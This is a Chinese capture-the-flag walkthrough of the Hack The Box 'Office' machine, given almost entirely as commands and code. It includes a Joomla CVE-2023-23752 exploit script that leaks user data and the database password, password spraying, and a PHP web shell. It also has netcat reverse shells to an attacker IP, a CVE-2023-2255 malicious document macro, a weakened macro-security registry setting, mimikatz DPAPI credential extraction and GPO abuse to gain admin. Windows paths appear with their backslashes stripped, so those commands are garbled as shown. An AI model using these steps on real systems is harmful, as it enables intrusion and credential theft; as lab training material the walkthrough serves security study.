# HTB Office实战式打靶过程

> 原文: https://www.ctfiot.com/217000.html
> ID: 217000

sudo nmap --min-rate 10000 -p- 10.10.11.3|grep open |awk -F/ '{print $1}'|paste -sd ','

sudo nmap -sC -sT -sV -O -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389 10.10.11.3

sudo bash -c "echo '10.10.11.3 dc.office.htb office.htb' >> /etc/hosts"

smbclient -L //10.10.11.3/

curl -v http://10.10.11.3/api/index.php/v1/config/application?public=true

curl -v http://10.10.11.3/api/index.php/v1/users?public=true

import requests
import json
import argparse
from colorama import Fore,Style,init

init(autoreset=True)

def fetch_users(base_url):
 users_api=f"{base_url}/api/index.php/v1/users?public=true"
 response=requests.get(users_api)
 return response.json()

def parse_users(base_url):
 data=fetch_users(base_url)['data']
 users=[]
 for user in data:
 if user['type']=='users':
 user_data=user['attributes']
 users.append({'id':
user_data['id'],'name':
user_data['name'],
 'username':
user_data['username'],'email':
user_data['email']
 ,'groups':
user_data['group_names']})
 return users

def display_users(base_url):
 users=parse_users(base_url)
 print(Fore.RED +Style.BRIGHT+"User_info")
 for user in users:
 print(f"id:{user['id']}n"
 f"name:{user['name']}n"
 f"username:{user['username']}n"
 f"email:{user['email']}n"
 f"groups:{user['groups']}")

def fetch_config(base_url):
 config_api=f"{base_url}/api/index.php/v1/config/application?public=true"
 response=requests.get(config_api)
 return response.json()

def parse_config(base_url):
 data=fetch_config(base_url)['data']
 configs={}
 for entry in data:
 if entry['type']=="application":
 key=list(entry['attributes'].keys())[0]
 configs[key]=entry['attributes'][key]
 return configs
def display_config(base_url):
 config=parse_config(base_url)
 print(Fore.RED + Style.BRIGHT + "db_info")
 print(f"dbtype: {config['dbtype']}")
 print(f"host: {config['host']}")
 print(f"user: {Fore.YELLOW + Style.BRIGHT + config['user']}")
 print(f"password: {Fore.YELLOW + Style.BRIGHT + config['password']}")
 print(f"db_name: {config['db']}")

def main():
 parser=argparse.ArgumentParser(description="Joomla!<4.28,CVE-2023-23752nusage:
python3 CVE-2023-23752.py -url ")
 parser.add_argument('-url',help="base_url")
 args=parser.parse_args()
 display_users(args.url)
 print()
 display_config(args.url)

if __name__=="__main__":
 main()

./kerbrute_linux_386 userenum -d office.htb --dc office.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50

crackmapexec smb 10.10.11.3 -u users -p 'H0lOgrams4reTakIng0Ver754!'

crackmapexec smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares

smbclient //10.10.11.3/"SOC Analysis" -U dwolfe --password 'H0lOgrams4reTakIng0Ver754!'

tshark -F pcap -r Latest-System-Dump-8fbc124d.pcap -w System_Dump.pcap

hashcat hash /usr/share/wordlists/rockyou.txt

crackmapexec smb 10.10.11.3 -u tstark -p 'playboy69'

crackmapexec smb 10.10.11.3 -u tstark -p 'playboy69'

sudo python -m http.server 80

<?php system($_GET['cmd']);?>

curl http://10.10.16.27/nc64.exe -o c:
programdatanc64.exe

c:
programdatanc64.exe -e cmd 10.10.16.27 443

wget 10.10.16.27/RunasCs.exe -outfile RunasCs.exe
./RunasCs.exe tstark playboy69 cmd.exe -r 10.10.16.27:
4444

netstat -an

chisel server -p 6666 --reverse

sudo nmap -sC -sT -sV -p8083 127.0.0.1

python3 CVE-2023-2255.py --cmd 'cmd /c c:
programdatanc64.exe -e powershell 10.10.16.27 4446' --output 'exploit.odt'

Sub Main
 shell("cmd /c c:
programdatanc64.exe -e cmd 10.10.16.27 4446")
End Sub

reg query "HKLMSoftwarePoliciesLibreOfficeorg.openoffice.Office.CommonSecurityScriptingMacroSecurityLevel"

$acl = Get-Acl -Path "HKLM:
SoftwarePoliciesLibreOfficeorg.openoffice.Office.CommonSecurityScriptingMacroSecurityLevel"
$acl.Access

Set-itemProperty -PATH "HKLM:
SoftwarePoliciesLibreOfficeorg.openoffice.Office.CommonSecurityScriptingMacroSecurityLevel" -Name Value -Value 0

Get-ChildItem -Force C:
UsersppottsAppDataRoamingMicrosoftProtect

Get-Childitem -Force C:
UsersppottsAppDataRoamingMicrosoftCredentials

.mimikatz.exe "dpapi::
masterkey /in:C:
usersppottsappdataroamingmicrosoftprotectS-1-5-21-1199398058-4196589450-691661856-1107191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" exit

.mimikatz.exe "dpapi::
cred /in:C:
UsersPPottsAppDataRoamingMicrosoftCredentials84F1CAEEBF466550F4967858F9353FB4 /masterkey:
87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" exit

evil-winrm -i 10.10.11.3 -u HHogan -p 'H4ppyFtW183#'

bloodhound-python -d office.htb -c all -u HHogan -p 'H4ppyFtW183#' -ns 10.10.11.3 --zip

./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "DEFAULT DOMAIN CONTROLLERS POLICY"

gpupdate /force

看雪ID：压强带师

https://bbs.kanxue.com/user-home-1014616.htm

*本文为看雪论坛优秀文章，由 压强带师 原创，转载请注明来自看雪社区

# 往期推荐

1、PWN入门-SROP拜师

2、一种apc注入型的Gamarue病毒的变种

3、野蛮fuzz：提升性能

4、关于安卓注入几种方式的讨论，开源注入模块实现

5、2024年KCTF水泊梁山-反混淆

球分享

球点赞

球在看

点击阅读原文查看更多


```
sudo nmap --min-rate 10000 -p- 10.10.11.3|grep open |awk -F/ '{print $1}'|paste -sd ','
sudo nmap -sC -sT -sV -O -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389 10.10.11.3
sudo bash -c "echo '10.10.11.3 dc.office.htb office.htb' >> /etc/hosts"
smbclient -L //10.10.11.3/
curl -v http://10.10.11.3/api/index.php/v1/config/application?public=true
curl -v http://10.10.11.3/api/index.php/v1/users?public=true
import requests
import json
import argparse
from colorama import Fore,Style,init

init(autoreset=True)

def fetch_users(base_url):
 users_api=f"{base_url}/api/index.php/v1/users?public=true"
 response=requests.get(users_api)
 return response.json()

def parse_users(base_url):
 data=fetch_users(base_url)['data']
 users=[]
 for user in data:
 if user['type']=='users':
 user_data=user['attributes']
 users.append({'id':
user_data['id'],'name':
user_data['name'],
 'username':
user_data['username'],'email':
user_data['email']
 ,'groups':
user_data['group_names']})
 return users

def display_users(base_url):
 users=parse_users(base_url)
 print(Fore.RED +Style.BRIGHT+"User_info")
 for user in users:
 print(f"id:{user['id']}n"
 f"name:{user['name']}n"
 f"username:{user['username']}n"
 f"email:{user['email']}n"
 f"groups:{user['groups']}")

def fetch_config(base_url):
 config_api=f"{base_url}/api/index.php/v1/config/application?public=true"
 response=requests.get(config_api)
 return response.json()

def parse_config(base_url):
 data=fetch_config(base_url)['data']
 configs={}
 for entry in data:
 if entry['type']=="application":
 key=list(entry['attributes'].keys())[0]
 configs[key]=entry['attributes'][key]
 return configs
def display_config(base_url):
 config=parse_config(base_url)
 print(Fore.RED + Style.BRIGHT + "db_info")
 print(f"dbtype: {config['dbtype']}")
 print(f"host: {config['host']}")
 print(f"user: {Fore.YELLOW + Style.BRIGHT + config['user']}")
 print(f"password: {Fore.YELLOW + Style.BRIGHT + config['password']}")
 print(f"db_name: {config['db']}")

def main():
 parser=argparse.ArgumentParser(description="Joomla!<4.28,CVE-2023-23752nusage:
python3 CVE-2023-23752.py -url ")
 parser.add_argument('-url',help="base_url")
 args=parser.parse_args()
 display_users(args.url)
 print()
 display_config(args.url)

if __name__=="__main__":
 main()
./kerbrute_linux_386 userenum -d office.htb --dc office.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50
crackmapexec smb 10.10.11.3 -u users -p 'H0lOgrams4reTakIng0Ver754!'
crackmapexec smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
smbclient //10.10.11.3/"SOC Analysis" -U dwolfe --password 'H0lOgrams4reTakIng0Ver754!'
tshark -F pcap -r Latest-System-Dump-8fbc124d.pcap -w System_Dump.pcap
hashcat hash /usr/share/wordlists/rockyou.txt
crackmapexec smb 10.10.11.3 -u tstark -p 'playboy69'
crackmapexec smb 10.10.11.3 -u tstark -p 'playboy69'
sudo python -m http.server 80
<?php system($_GET['cmd']);?>
curl http://10.10.16.27/nc64.exe -o c:
programdatanc64.exe
c:
programdatanc64.exe -e cmd 10.10.16.27 443
wget 10.10.16.27/RunasCs.exe -outfile RunasCs.exe
./RunasCs.exe tstark playboy69 cmd.exe -r 10.10.16.27:
4444
netstat -an
chisel server -p 6666 --reverse
sudo nmap -sC -sT -sV -p8083 127.0.0.1
python3 CVE-2023-2255.py --cmd 'cmd /c c:
programdatanc64.exe -e powershell 10.10.16.27 4446' --output 'exploit.odt'
Sub Main
 shell("cmd /c c:
programdatanc64.exe -e cmd 10.10.16.27 4446")
End Sub
reg query "HKLMSoftwarePoliciesLibreOfficeorg.openoffice.Office.CommonSecurityScriptingMacroSecurityLevel"
$acl = Get-Acl -Path "HKLM:
SoftwarePoliciesLibreOfficeorg.openoffice.Office.CommonSecurityScriptingMacroSecurityLevel"
$acl.Access
Set-itemProperty -PATH "HKLM:
SoftwarePoliciesLibreOfficeorg.openoffice.Office.CommonSecurityScriptingMacroSecurityLevel" -Name Value -Value 0
Get-ChildItem -Force C:
UsersppottsAppDataRoamingMicrosoftProtect
Get-Childitem -Force C:
UsersppottsAppDataRoamingMicrosoftCredentials
.mimikatz.exe "dpapi::
masterkey /in:C:
usersppottsappdataroamingmicrosoftprotectS-1-5-21-1199398058-4196589450-691661856-1107191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" exit
.mimikatz.exe "dpapi::
cred /in:C:
UsersPPottsAppDataRoamingMicrosoftCredentials84F1CAEEBF466550F4967858F9353FB4 /masterkey:
87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" exit
evil-winrm -i 10.10.11.3 -u HHogan -p 'H4ppyFtW183#'
bloodhound-python -d office.htb -c all -u HHogan -p 'H4ppyFtW183#' -ns 10.10.11.3 --zip
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "DEFAULT DOMAIN CONTROLLERS POLICY"
gpupdate /force
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/2-1732621935.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1732621936.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1732621936.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1732621936.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1732621937.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/7-1732621937.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1732621938.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1732621938.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1732621938.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1732621939.jpeg)